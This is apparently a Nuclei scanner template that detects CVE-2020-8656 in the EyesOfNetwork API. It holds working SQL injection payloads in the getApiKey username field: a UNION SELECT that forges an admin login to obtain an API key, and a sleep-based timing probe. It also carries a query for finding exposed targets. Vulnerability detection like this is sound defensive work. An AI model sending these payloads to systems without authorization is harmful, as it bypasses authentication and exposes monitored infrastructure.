http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - contains(body_1, "EONAPI_KEY")
    type: dsl
  - condition: and
    dsl:
    - duration_2>=6
    - status_code_2 == 401
    - contains_all(body_2, "api_version", "username-password credentials")
    type: dsl
  matchers-condition: or
  raw:
  - 'GET /eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet
    HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 20s

    GET /eonapi/getApiKey?username=%27%20union%20select%20sleep(6),0,0,0,0,0,0,0%20or%20%27
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2020-8656
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:eyesofnetwork:eyesofnetwork:5.3-0:*:*:*:*:*:*:*
    cve-id: CVE-2020-8656
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
    epss-percentile: 0.98941
    epss-score: 0.77688
  description: 'An issue was discovered in EyesOfNetwork 5.3. The EyesOfNetwork API
    2.4.2 is prone to SQL injection, allowing an unauthenticated attacker to perform
    various tasks such as authentication bypass via the username field to getApiKey
    in include/api_functions.php.

    '
  impact: 'Unauthenticated attackers can bypass authentication via SQL injection and
    gain access to the EyesOfNetwork monitoring system and all monitored infrastructure
    data.

    '
  metadata:
    fofa-query: title="EyesOfNetwork"
    max-request: 2
    product: eyesofnetwork
    vendor: eyesofnetwork
    verified: true
  name: EyesOfNetwork - Hardcoded API Key & SQL Injection
  reference:
  - https://www.exploit-db.com/exploits/48025
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8656
  - https://github.com/EyesOfNetworkCommunity/eonapi/issues/17
  remediation: 'Apply security patches or update to the latest version of EyesOfNetwork.

    '
  severity: critical
  tags: cve,cve2020,eyesofnetwork,hardcoded-key,sqli,vuln,vkev
